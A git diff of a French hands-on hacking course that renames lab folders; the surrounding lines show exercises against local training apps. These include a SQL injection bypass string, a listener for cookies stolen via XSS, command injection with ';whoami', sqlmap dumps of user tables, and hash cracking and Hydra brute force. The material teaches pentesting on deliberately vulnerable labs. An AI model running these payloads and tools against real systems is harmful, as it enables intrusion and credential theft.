@@ -44,7 +44,7 @@ sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes ex
 
 ```bash
 # Création de l'arborescence de travail pour les 5 jours de cours + hors-série (-p = crée les parents si absents)
-mkdir -p ~/cours-hacking/labs/{jour-1,jour-2,jour-3,jour-4,jour-5} ~/cours-hacking/extra
+mkdir -p ~/cours-hacking/labs/{jour-01,jour-02,jour-03,jour-04,jour-05} ~/cours-hacking/extra
 # Création des dossiers pour chaque jour (brace expansion)
 mkdir -p ~/cours-hacking/labs/jour-{1,2,3,4,5}
 # cd (change directory) = se déplacer dans le dossier spécifié ; ~/ = raccourci vers le home directory
@@ -58,11 +58,11 @@ Une fois le dépôt cloné, votre arborescence de travail est la suivante :
 ```text
 ~/cours-hacking/
 ├── labs/
-│   ├── jour-1/            # Travaux pratiques J1
-│   ├── jour-2/            # Travaux pratiques J2
-│   ├── jour-3/            # Travaux pratiques J3
-│   ├── jour-4/            # Travaux pratiques J4
-│   └── jour-5/            # Travaux pratiques J5
+│   ├── jour-01/            # Travaux pratiques J1
+│   ├── jour-02/            # Travaux pratiques J2
+│   ├── jour-03/            # Travaux pratiques J3
+│   ├── jour-04/            # Travaux pratiques J4
+│   └── jour-05/            # Travaux pratiques J5
 ├── extra/                 # Projets complémentaires
 └── repo/                  # Dépôt du cours (ce répertoire)
     ├── JOUR-01*.md        # Supports de cours
@@ -316,7 +316,7 @@ admin' OR '1'='1' --
 
 | Durée | Conteneur | Dossier | Outils |
 |---|---|---|---|
-| 30 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-1/` | nmap, gobuster, curl |
+| 30 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-01/` | nmap, gobuster, curl |
 
 ### Contexte métier
 
@@ -325,7 +325,7 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 ### Étape 1 — Scan nmap
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 # 📌 Scan nmap du port DVWA : détection de version du service web
 # 🔍 -sV = probe les bannières pour identifier la version précise du service
 # 🔍 -p 8088 = port cible, tee = affiche la sortie ET la sauvegarde dans un fichier
@@ -336,7 +336,7 @@ nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
 ### Étape 2 — Énumération gobuster
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 # 📌 Énumération des répertoires web cachés avec gobuster
 # 🔍 dir = mode scan de répertoires, -u = URL cible, -w = wordlist de noms communs
 # 🔍 -q = mode silencieux (masque la bannière), | tee = affiche + sauvegarde
@@ -430,7 +430,7 @@ Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :
 
 **Terminal 1** — écouteur HTTP :
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 # Lancement d'un serveur HTTP minimal sur le port 8000 (-m http.server) pour recevoir les cookies exfiltrés via XSS
 # Lancement d'un serveur HTTP minimal sur le port 8000 : -m = exécute le module Python http.server intégré
 # 8000 = port d'écoute arbitraire ; le serveur affiche chaque requête entrante (URL, IP source, User-Agent)
@@ -518,7 +518,7 @@ curl -s -b /tmp/dvwa_cookie.txt \
 ### Étape 2 — sqlmap : dumper les utilisateurs
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # sqlmap : --load-cookies = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
 # -u = URL cible, -D = base de données cible (dvwa), -T users = table cible
@@ -674,7 +674,7 @@ curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoam
 
 | Durée | Conteneur | Dossier | Techniques |
 |---|---|---|---|
-| 1h | sqli-app (port 8083) | `~/cours-hacking/labs/jour-1/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
+| 1h | sqli-app (port 8083) | `~/cours-hacking/labs/jour-01/` | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
 
 ### Contexte métier
 
@@ -699,8 +699,8 @@ L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection dif
 cd ~/cours-hacking/repo && docker compose up -d sqli-app
 # Vérification rapide que l'appli web répond (-I = HEAD, ne télécharge que les en-têtes HTTP)
 curl -I http://localhost:8083/
-# Création du dossier de labs jour-1 et déplacement dedans (&& garantit l'exécution séquentielle)
-mkdir -p ~/cours-hacking/labs/jour-1 && cd ~/cours-hacking/labs/jour-1
+# Création du dossier de labs jour-01 et déplacement dedans (&& garantit l'exécution séquentielle)
+mkdir -p ~/cours-hacking/labs/jour-01 && cd ~/cours-hacking/labs/jour-01
 ```
 
 ### Étape 1 — Trouver les injections manuellement
@@ -761,7 +761,7 @@ curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,user
 ### Étape 2 — Exploitation automatisée avec sqlmap
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # sqlmap : --tables = énumère toutes les tables de la base, --batch = mode non-interactif (répond oui par défaut)
 # 2>&1 redirige stderr vers stdout pour tout capturer, tee sauvegarde la sortie ET l'affiche dans le terminal
@@ -826,7 +826,7 @@ Sortie attendue :
 #### Méthode 1 : john the ripper
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # Création du fichier de hashs au format username:hash (une entrée par ligne)
 # cat > avec heredoc (<< 'EOF') écrit le contenu multiligne dans hashes.txt
@@ -880,7 +880,7 @@ flag_user:admin
 #### Méthode 3 : hashcat (si GPU disponible)
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 # hashcat : -m 0 = mode MD5 (hash type 0), -a 0 = attaque par dictionnaire (straight), --username = ignore la partie user: du fichier
 # --force = ignore les avertissements (pilote GPU manquant, matériel non optimal)
 hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
@@ -891,7 +891,7 @@ hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 ### Étape 4 — Extraire le flag caché
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # Extraction du flag caché dans la table products : -T products = table cible, -C name,secret_flag = colonnes à dumper
 # Le champ secret_flag contient le flag CTF à trouver (contient NULL pour les produits sans flag)
@@ -955,7 +955,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
-| 45 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-1/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
+| 45 min | dvwa (port 8088) | `~/cours-hacking/labs/jour-01/` | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
 
 ### Contexte métier
 
@@ -966,7 +966,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 ### Prérequis
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 # Vérifier que le cookie jar DVWA est toujours valide
 curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
 # → 200  (la session est active, on peut travailler)
@@ -977,7 +977,7 @@ curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost
 Avant de lancer Hydra, il faut comprendre la structure du formulaire : méthode HTTP, noms des champs, message d'échec.
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # 📌 Récupérer le HTML de la page de login pour identifier les noms des champs
 # 🔍 curl -s = mode silencieux, -b = envoie le cookie de session
@@ -997,7 +997,7 @@ curl -s -b /tmp/dvwa_cookie.txt \
 ### Étape 2 — Lancer Hydra
 
 ```bash
-cd ~/cours-hacking/labs/jour-1
+cd ~/cours-hacking/labs/jour-01
 
 # 📌 Hydra teste le login admin contre la wordlist rockyou.txt
 # 🔍 -l admin = login unique (-l = single login, -L = fichier de logins)
